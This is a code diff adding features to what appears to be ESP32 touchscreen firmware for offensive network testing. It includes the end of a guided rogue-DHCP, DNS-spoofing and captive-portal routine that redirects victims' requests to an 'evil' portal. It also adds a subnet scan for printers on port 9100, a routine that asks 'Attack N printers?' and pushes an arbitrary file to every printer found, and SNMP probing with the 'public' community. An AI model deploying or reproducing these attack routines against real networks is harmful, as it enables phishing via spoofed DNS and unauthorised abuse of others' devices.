+    while (true) {
+      TouchPoint touch = ts.getTouch();
+      if (touch.zRaw != 0 && touch.yRaw > (tft.height() / 2)) {
+        break;
+      }
+      delay(100);
+    }
+  }
+  rogueDHCPAuto();
+  screenDebounce();
+  if (DHCPDNSExplain) {
+    tft.fillScreen(menuBackgroundColor);
+    tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+    tft.setCursor(0, 20);
+    tft.println("Step 3 : Start the Web");
+    tft.println("server with DNS Spoofing.");
+    tft.println("Start the portal to");
+    tft.println("provide page and DNS.");
+    tft.println("The DNS spoof any request");
+    tft.println("to redirect to the evil.");
+    tft.println("Press Enter to start");
+
+    while (true) {
+      TouchPoint touch = ts.getTouch();
+      if (touch.zRaw != 0 && touch.yRaw > (tft.height() / 2)) {
+        break;
+      }
+      delay(100);
+    }
+  }
+  createCaptivePortal();
+  screenDebounce();
+  if (DHCPDNSExplain) {
+    tft.fillScreen(menuBackgroundColor);
+    tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+    tft.setCursor(0, 20);
+    tft.println("Step 4 : Change DNS IP.");
+    tft.println("Changing DNS IP with");
+    tft.println("local IP address to");
+    tft.println("provide Spoffed DNS query.");
+    tft.println("Press Enter to change");
+
+    while (true) {
+      TouchPoint touch = ts.getTouch();
+      if (touch.zRaw != 0 && touch.yRaw > (tft.height() / 2)) {
+        break;
+      }
+      delay(100);
+    }
+  }
+  switchDNS();
+}
+
+
+
+
+
+
+// Global vector for detected printers
+std::vector<IPAddress> detectedPrinters;
+
+// Checks if a host is a printer (port 9100 open)
+bool isPrinter(IPAddress ip, uint32_t timeout_ms = 150) {
+  WiFiClient client; // Instance of WiFiClient
+  Serial.printf("[TEST] Checking IP: %s for printer on port 9100\n", ip.toString().c_str());
+
+  if (connectWithTimeout(client, ip, 9100, timeout_ms)) {
+    Serial.printf("[INFO] Printer detected at IP: %s\n", ip.toString().c_str());
+    client.stop(); // Close the connection properly
+    return true;
+  } else {
+    Serial.printf("[INFO] No printer found at IP: %s\n", ip.toString().c_str());
+    return false;
+  }
+}
+
+bool validateBaseIP(const String& baseIP) {
+  int dotCount = 0;
+  for (char c : baseIP) {
+    if (c == '.') dotCount++;
+    else if (!isDigit(c)) return false;
+  }
+  return dotCount == 2; // Ensures "192.168.1" contains only two dots
+}
+
+String getNetworkBase() {
+  String baseIP = "";
+  tft.fillScreen(TFT_BLACK);
+  tft.setTextSize(1.5);
+  tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  tft.setCursor(0, 0);
+  tft.println("Enter base IP (192.168.1)");
+  tft.println("Or ok for current net<ork");
+  tft.setCursor(0, 50);
+  delay(2000);
+  while (true) {
+    baseIP = getUserInput();
+
+    // If the user enters "ok", use the current network IP
+    if (baseIP == "ok") {
+      IPAddress currentIP = WiFi.localIP();
+      char fallbackIP[16];
+      sprintf(fallbackIP, "%d.%d.%d", currentIP[0], currentIP[1], currentIP[2]);
+      return String(fallbackIP);
+    }
+
+    // Validate partial IP address format
+    if (validateBaseIP(baseIP)) {
+      return baseIP;
+    } else {
+      tft.setCursor(0, 80);
+      tft.println("Invalid format! Retry.");
+      delay(2000);
+      tft.fillScreen(TFT_BLACK);
+      tft.setCursor(0, 0);
+      tft.println("Enter base IP (192.168.1):");
+    }
+  }
+}
+
+void detectPrinter() {
+  if (WiFi.localIP().toString() == "0.0.0.0") {
+    Serial.println("[INFO] Not connected to a network.");
+    waitAndReturnToMenu("Not connected to a network.");
+    return;
+  }
+
+  // Get the base network IP
+  String baseIP = getNetworkBase();
+  char base_ip[16];
+  sprintf(base_ip, "%s.", baseIP.c_str());
+
+  Serial.println("[INFO] Network base IP: " + String(base_ip));
+  tft.fillScreen(TFT_BLACK);
+  tft.setCursor(0, 20);
+  tft.println("Scanning for printers...");
+
+
+  detectedPrinters.clear();
+
+  // Scan subnet IP addresses
+  for (int i = 1; i <= 254; i++) {
+    IPAddress currentIP;
+    sscanf(base_ip, "%d.%d.%d.", &currentIP[0], &currentIP[1], &currentIP[2]);
+    currentIP[3] = i;
+
+    Serial.printf("[DEBUG] Checking IP: %s\n", currentIP.toString().c_str());
+
+    // Check directly for port 9100 with a 100ms timeout
+    if (isPrinter(currentIP, 100)) {
+      detectedPrinters.push_back(currentIP);
+      Serial.printf("[INFO] Printer detected: %s\n", currentIP.toString().c_str());
+    }
+
+    // Progress update
+    if (i % 10 == 0) {
+      tft.setCursor(0, 40);
+      tft.printf("Scanned %d/254 IPs...\n", i);
+
+    }
+  }
+
+  // Final result
+  tft.fillScreen(TFT_BLACK);
+  if (detectedPrinters.empty()) {
+    tft.setCursor(0, 20);
+    tft.println("No printers detected.");
+    tft.println("Returning to menu...");
+
+    Serial.println("[INFO] No printers detected.");
+  } else {
+    tft.setCursor(0, 20);
+    tft.println("Printers found:");
+    for (const auto &printerIP : detectedPrinters) {
+      Serial.println(" - " + printerIP.toString());
+      tft.println(printerIP.toString());
+    }
+
+  }
+
+  delay(2000);
+  waitAndReturnToMenu("return to menu");
+}
+
+void printFile() {
+  if (WiFi.localIP().toString() == "0.0.0.0") {
+    Serial.println("[INFO] Not connected to a network.");
+    waitAndReturnToMenu("Not connected to a network.");
+    return;
+  }
+  // File path to print and printer IP configuration
+  String filePath = "/Printer/File-To-Print.txt"; // Replace with your file
+  String printerConfigPath = "/Printer/PrinterIp.txt";
+
+  std::vector<IPAddress> printerIPs;
+
+  // Check for necessary files
+  if (!SD.exists(filePath)) {
+    tft.fillScreen(TFT_BLACK);
+    tft.setCursor(0, 20);
+    tft.println("File not found:");
+    tft.println(filePath);
+    waitAndReturnToMenu("return to menu");
+    return;
+  }
+
+  if (!SD.exists(printerConfigPath)) {
+    Serial.println("Printer configuration file not found.");
+  }
+
+  // Open printer configuration file
+  File config = SD.open(printerConfigPath);
+  if (config) {
+    while (config.available()) {
+      String line = config.readStringUntil('\n');
+      line.trim(); // Removes whitespace and newlines
+      if (line.length() > 0) {
+        IPAddress ip;
+        if (ip.fromString(line)) {
+          printerIPs.push_back(ip);
+        } else {
+          Serial.printf("Invalid IP format in PrinterIp.txt: %s\n", line.c_str());
+        }
+      }
+    }
+    config.close();
+  }
+
+  // If the file is empty, use detected printers
+  if (printerIPs.empty()) {
+    printerIPs = detectedPrinters;
+  }
+
+  // Check if there are printers to process
+  if (printerIPs.empty()) {
+    tft.fillScreen(TFT_BLACK);
+    tft.setCursor(0, 20);
+    tft.println("No printers detected");
+    tft.println("or configured.");
+    tft.println("Returning to menu...");
+
+    delay(2000);
+    waitAndReturnToMenu("return to menu");
+    return;
+  }
+
+  // Confirm operation with the user
+  String message = "Attack " + String(printerIPs.size()) + " printers?";
+  if (!confirmPopup(message)) {
+    tft.fillScreen(TFT_BLACK);
+    tft.setCursor(0, 20);
+    tft.println("Operation cancelled by user.");
+
+    delay(2000);
+    waitAndReturnToMenu("return to menu");
+    return;
+  }
+
+  // Open the file to print
+  File file = SD.open(filePath);
+  if (!file) {
+    tft.fillScreen(TFT_BLACK);
+    tft.setCursor(0, 20);
+    tft.println("Failed to open file:");
+    tft.println(filePath);
+    tft.println("Returning to menu...");
+
+    delay(2000);
+    waitAndReturnToMenu("return to menu");
+    return;
+  }
+
+  // Send the file to each printer
+  for (IPAddress printerIP : printerIPs) {
+    WiFiClient client;
+
+    // Connect to the printer on port 9100
+    if (!client.connect(printerIP, 9100)) {
+      Serial.printf("Failed to connect to printer: %s\n", printerIP.toString().c_str());
+      continue;
+    }
+
+    // Display current status on the screen
+    tft.fillScreen(TFT_BLACK);
+    tft.setCursor(0, 20);
+    tft.println("Printing to:");
+    tft.println(printerIP.toString());
+
+    delay(200);
+
+    // Reset file position
+    file.seek(0);
+
+    // Read the file and send its content to the printer
+    while (file.available()) {
+      String line = file.readStringUntil('\n'); // Read line by line
+      client.println(line);                     // Send to the printer
+    }
+
+    client.stop();
+    Serial.printf("Print job completed for printer: %s\n", printerIP.toString().c_str());
+  }
+
+  file.close();
+
+  // Confirm operation completion
+  tft.fillScreen(TFT_BLACK);
+  tft.setCursor(0, 20);
+  tft.println("Print job completed");
+  tft.println("on all printers!");
+
+  delay(2000);
+  waitAndReturnToMenu("return to menu");
+}
+
+
+
+// Define the SNMP community and port
+#define SNMP_PORT 161
+#define SNMP_COMMUNITY "public"
+
+// Function to encode an OID into BER format
+int encodeOID(const char* oidStr, uint8_t* outBuffer, size_t outSize) {
+  std::vector<int> parts;
+  char temp[64];
+  strncpy(temp, oidStr, sizeof(temp) - 1);
+  temp[sizeof(temp) - 1] = '\0';
+
+  char* token = strtok(temp, ".");
+  while (token) {
+    parts.push_back(atoi(token));
+    token = strtok(nullptr, ".");
+  }
+
+  if (parts.size() < 2) return -1; // Invalid OID
+
+  int pos = 0;
+  outBuffer[pos++] = (uint8_t)(parts[0] * 40 + parts[1]);
+
+  for (size_t i = 2; i < parts.size(); i++) {
+    int val = parts[i];
+    if (val < 128) {
+      outBuffer[pos++] = (uint8_t)val;
+    } else {
+      return -1; // Simplified: no multi-byte support
+    }
+    if (pos >= (int)outSize) return -1;
+  }
+  return pos;
+}
+
+
+bool parseSNMPResponse(const uint8_t* buffer, size_t bufferLen, String &outValue) {
+  // Keep an index that moves through buffer
+  size_t index = 0;
+
+  // 1) Expect top-level SEQUENCE (0x30)
+  if (buffer[index++] != 0x30) {
+    Serial.println("[ERROR] Not a SEQUENCE at top-level.");
+    return false;
+  }
+  // Read length
+  uint8_t snmpMsgLength = buffer[index++];
+
+  // 2) Read version INTEGER
+  if (buffer[index++] != 0x02) {
+    Serial.println("[ERROR] Expected version INTEGER tag.");
+    return false;
+  }
+  uint8_t versionLength = buffer[index++];
+  // Skip the version bytes
+  index += versionLength;
+
+  // 3) Read community OCTET STRING
+  if (buffer[index++] != 0x04) {
+    Serial.println("[ERROR] Expected community OCTET STRING tag.");
+    return false;
+  }
+  uint8_t communityLength = buffer[index++];
+  // Skip the community bytes
+  index += communityLength;
+
+  // 4) Read PDU type (0xA2 for Get-Response)
+  uint8_t pduType = buffer[index++];
+  if (pduType != 0xA2) {
+    Serial.printf("[WARN] Unexpected PDU type: 0x%02X\n", pduType);
+  }
+  uint8_t pduLength = buffer[index++];
+
+  // 5) Read request-id INTEGER
+  if (buffer[index++] != 0x02) {
+    Serial.println("[ERROR] Expected request-id INTEGER tag.");
+    return false;
+  }
+  uint8_t ridLength = buffer[index++];
+  index += ridLength; // skip request id bytes
+
+  // 6) Read error-status INTEGER
+  if (buffer[index++] != 0x02) {
+    Serial.println("[ERROR] Expected error-status INTEGER tag.");
+    return false;
+  }
+  uint8_t errStatusLen = buffer[index++];
+  index += errStatusLen; // skip error status
+
+  // 7) Read error-index INTEGER
+  if (buffer[index++] != 0x02) {
+    Serial.println("[ERROR] Expected error-index INTEGER tag.");
+    return false;
+  }
+  uint8_t errIndexLen = buffer[index++];
+  index += errIndexLen; // skip error index
+
+  // 8) Read variable-bindings SEQUENCE
+  if (buffer[index++] != 0x30) {
+    Serial.println("[ERROR] Expected VarBind list SEQUENCE (0x30).");
+    return false;
+  }
+  uint8_t vbListLength = buffer[index++];
+
+  // 9) Read first VarBind SEQUENCE
+  if (buffer[index++] != 0x30) {
+    Serial.println("[ERROR] Expected single VarBind SEQUENCE (0x30).");
+    return false;
+  }
+  uint8_t vbLength = buffer[index++];
+
+  // 10) Read the OID
+  if (buffer[index++] != 0x06) {
+    Serial.println("[ERROR] Expected OID tag (0x06).");
+    return false;
+  }
+  uint8_t oidLength = buffer[index++];
+  // skip the OID bytes
+  index += oidLength;
+
+  // 11) Now read the Value portion
+  uint8_t valueTag = buffer[index++];
+  uint8_t valueLen = buffer[index++];
+
+  if (valueTag == 0x04) {
+    // OCTET STRING
+    // Copy out the next valueLen bytes as text
+    char temp[128];
+    if (valueLen >= sizeof(temp)) valueLen = sizeof(temp) - 1;
+    memcpy(temp, &buffer[index], valueLen);
+    temp[valueLen] = '\0';
+    outValue = String(temp);
+  }
+  else if (valueTag == 0x02) {
+    // INTEGER
+    if (valueLen == 1) {
+      int val = buffer[index];
+      outValue = String(val);
+    } else {
+      // For simplicity, handle only 1-byte integers in this example
+      outValue = F("[Unsupported multi-byte INTEGER]");
+    }
+  }
+  else if (valueTag == 0x43) {
+    // TIME TICKS
+    // Usually 4 bytes, big-endian
+    if (valueLen == 4) {
+      uint32_t ticks =
+        (uint32_t)buffer[index] << 24 |
+        (uint32_t)buffer[index + 1] << 16 |
+        (uint32_t)buffer[index + 2] <<  8 |
+        (uint32_t)buffer[index + 3];
+      // Convert ticks (1/100s) to some readable format
+      // E.g., "1d 10:20:30" etc.
+      outValue = String(ticks) + " (raw ticks)";
+    } else {
+      outValue = F("[Unsupported TIME TICKS length]");
+    }
+  }
+  else {
+    // For any other tag
+    outValue = F("[Unhandled data type]");
+  }
+
+  // Advance index by valueLen
+  index += valueLen;
+
+  return true;
+}
+
+
+// Function to send an SNMP GET request
+bool sendSNMPRequest(IPAddress printerIP, const char* oid, String& response) {
+  uint8_t packet[100];
+  int pos = 0;
+
+  // SNMP header
+  packet[pos++] = 0x30; // Sequence
+  int lengthPos = pos++;
+
+  // Version
+  packet[pos++] = 0x02; // Integer
+  packet[pos++] = 0x01;
+  packet[pos++] = 0x00; // SNMP version 1
+
+  // Community
+  packet[pos++] = 0x04; // Octet string
+  packet[pos++] = strlen(SNMP_COMMUNITY);
+  memcpy(&packet[pos], SNMP_COMMUNITY, strlen(SNMP_COMMUNITY));
+  pos += strlen(SNMP_COMMUNITY);
+
+  // PDU header
+  packet[pos++] = 0xA0; // GET Request
+  int pduLengthPos = pos++;
+
+  packet[pos++] = 0x02; // Integer (request ID)
+  packet[pos++] = 0x01;
+  packet[pos++] = 0x01; // Request ID = 1
+
+  packet[pos++] = 0x02; // Integer (error status)
+  packet[pos++] = 0x01;
+  packet[pos++] = 0x00; // No error
+
+  packet[pos++] = 0x02; // Integer (error index)
+  packet[pos++] = 0x01;
+  packet[pos++] = 0x00; // No error
+
+  // Variable bindings
+  packet[pos++] = 0x30; // SEQUENCE (Variable-binding structure)
+  int vbSequenceLengthPos = pos++; // Placeholder for the length of the entire variable-binding sequence
+
+  // Single variable-binding
+  packet[pos++] = 0x30; // SEQUENCE (Single variable-binding)
+  int vbLengthPos = pos++; // Placeholder for the length of this variable-binding
+
+  // Add the OID
+  packet[pos++] = 0x06; // OBJECT IDENTIFIER
+  uint8_t encodedOID[32];
+  int encodedLen = encodeOID(oid, encodedOID, sizeof(encodedOID));
+  if (encodedLen < 0) return false;
+  packet[pos++] = encodedLen; // Length of OID
+  memcpy(&packet[pos], encodedOID, encodedLen);
+  pos += encodedLen;
+
+  // Add the value (NULL)
+  packet[pos++] = 0x05; // NULL
+  packet[pos++] = 0x00; // Length of NULL
+
+  // Calculate the length of the single variable-binding
+  packet[vbLengthPos] = pos - vbLengthPos - 1;
+
+  // Calculate the length of the variable-binding sequence
+  packet[vbSequenceLengthPos] = pos - vbSequenceLengthPos - 1;
+
+  // Update the PDU and SNMP message lengths
+  packet[pduLengthPos] = pos - pduLengthPos - 1;
+  packet[lengthPos] = pos - lengthPos - 1;
+
+  /*// Debug: Print the packet being sent
+    Serial.println("[DEBUG] Sending SNMP Packet:");
+    for (int i = 0; i < pos; i++) {
+      Serial.printf("%02X ", packet[i]);
+    }
+    Serial.println();*/
+
+  // Envoi du paquet
+  udp.beginPacket(printerIP, SNMP_PORT);
+  udp.write(packet, pos);
+  udp.endPacket();
+
+  // Attente de la réponse
+  uint32_t startTime = millis();
+  while (millis() - startTime < 1000) {
+    int packetSize = udp.parsePacket();
+    if (packetSize) {
+      uint8_t buffer[255];
+      udp.read(buffer, sizeof(buffer));
+
+      /*// Debug : afficher le paquet reçu
+        Serial.println("[DEBUG] Received SNMP Response:");
+        for (int i = 0; i < packetSize; i++) {
+          Serial.printf("%02X ", buffer[i]);
+        }
+        Serial.println();*/
+
+      // Appel à une fonction de parsing BER-SNMP (à implémenter ou à inclure d'une librairie)
+      String parsedValue;
+      if (parseSNMPResponse(buffer, packetSize, parsedValue)) {
+        response = parsedValue;
+      } else {
+        response = F("Parsing error");
+      }
+
+      return true;
+    }
+  }
+
+  return false;
+}
+
+void checkPrinterStatus() {
+  int displayStart = 0;
+  int lineHeight = 12;
+  int maxLines = tft.height() / lineHeight;
+  bool needsDisplayUpdate = true;
+
+  if (WiFi.localIP().toString() == "0.0.0.0") {
+    Serial.println("[INFO] Not connected to a network.");
+    return;
+  }
+
+  // On prépare notre vecteur de lignes à afficher
+  std::vector<String> printerLines;
+  printerLines.reserve(50); // Par exemple, on réserve un peu d'espace
+
+  // Chemin de config
+  String printerConfigPath = "/Printer/PrinterIp.txt";
+  std::vector<IPAddress> printerIPs;
+
+  // Lecture du fichier IP
+  if (SD.exists(printerConfigPath)) {
+    File config = SD.open(printerConfigPath);
+    if (config) {
+      while (config.available()) {
+        String line = config.readStringUntil('\n');
+        line.trim();
+        IPAddress ip;
+        if (ip.fromString(line)) {
+          printerIPs.push_back(ip);
+        }
+      }
+      config.close();
+    }
+  }
+
+  if (printerIPs.empty()) {
+    Serial.println("[INFO] No printers detected or configured.");
+    printerIPs = detectedPrinters;
+
+  }
+
+  // OIDs SNMP
+  const char* deviceOid = "1.3.6.1.2.1.25.3.2.1.3.1";
+  const char* statusOid = "1.3.6.1.2.1.25.3.2.1.5.1";
+  const char* uptimeOid = "1.3.6.1.2.1.1.3.0";
+
+  // Pour chaque imprimante
+  for (const auto& printerIP : printerIPs) {
+    String device = "Unknown";
+    String status = "Unknown";
+    String uptime = "Unknown";
+
+    bool okDevice = sendSNMPRequest(printerIP, deviceOid, device);
+    bool okStatus = sendSNMPRequest(printerIP, statusOid, status);
+    bool okUptime = sendSNMPRequest(printerIP, uptimeOid, uptime);
+
+    printerLines.push_back("-----------------------");
+    printerLines.push_back(printerIP.toString());
+    printerLines.push_back("-----------------------");
+
+    // DEVICE
+    if (okDevice) {
+      printerLines.push_back(device);
+      Serial.printf("[INFO] %s => Device: %s\n",
+                    printerIP.toString().c_str(),
+                    device.c_str());
+    } else {
+      printerLines.push_back("Device: Error");
+      Serial.printf("[ERROR] %s => Device fetch failed\n",
+                    printerIP.toString().c_str());
+    }
+
+    // STATUS
+    if (okStatus) {
+      // Convertir la valeur (1..5) en chaîne
+      if (status.equals("1"))      status = "Unknown";
+      else if (status.equals("2")) status = "Running";
+      else if (status.equals("3")) status = "Warning";
+      else if (status.equals("4")) status = "Testing";
+      else if (status.equals("5")) status = "Down";
+      else                         status = "Other";
+
+      printerLines.push_back(status);
+      Serial.printf("[INFO] %s => Status: %s\n",
+                    printerIP.toString().c_str(),
+                    status.c_str());
+    } else {
+      printerLines.push_back("Status: Error");
+      Serial.printf("[ERROR] %s => Status fetch failed\n",
+                    printerIP.toString().c_str());
+    }
+
+    if (okUptime) {
+      // Si par ex. "113021400 (raw ticks)"
+      if (uptime.endsWith("(raw ticks)")) {
+        int spaceIndex = uptime.indexOf(' ');
+        if (spaceIndex > 0) {
+          String ticksStr = uptime.substring(0, spaceIndex);
+          uint32_t ticksVal = ticksStr.toInt();
+
+          // Convert ticks in j/h/m/s
+          uint32_t totalSeconds = ticksVal / 100;
+          uint32_t days    = totalSeconds / 86400;
+          uint32_t hours   = (totalSeconds % 86400) / 3600;
+          uint32_t minutes = (totalSeconds % 3600) / 60;
+          uint32_t seconds = totalSeconds % 60;
+
+          char buff[64];
+          snprintf(buff, sizeof(buff),
+                   "%ud %02u:%02u:%02u", days, hours, minutes, seconds);
+          uptime = String(buff);
+        }
+      }
+      printerLines.push_back(uptime);
+      Serial.printf("[INFO] %s => Uptime: %s\n",
+                    printerIP.toString().c_str(),
+                    uptime.c_str());
+    } else {
+      printerLines.push_back("Uptime: Error");
+      Serial.printf("[ERROR] %s => Uptime fetch failed\n",
+                    printerIP.toString().c_str());
+    }
+  }
+
+  printerLines.push_back("-----------------------");
+  printerLines.push_back("Scan Terminated.");
+  printerLines.push_back("-----------------------");
+
+  displayStart = 0; // on remet à zéro l'index de scroll
+  needsDisplayUpdate = true;
+  screenDebounce();
+  while (true) {
+
+
+    if (handleScrolling(displayStart, maxLines, printerLines.size())) {
+      needsDisplayUpdate = true;
+    }
+
+    if (needsDisplayUpdate) {
+      displayResults(displayStart, maxLines, printerLines);
+      needsDisplayUpdate = false;
+    }
+
+    TouchPoint touch = ts.getTouch();
+    if (touch.zRaw != 0 && touch.yRaw > (tft.height() / 2)) {
+      break;
+    }
+    delay(50);
+  }
+
+  waitAndReturnToMenu("return to menu");
 }
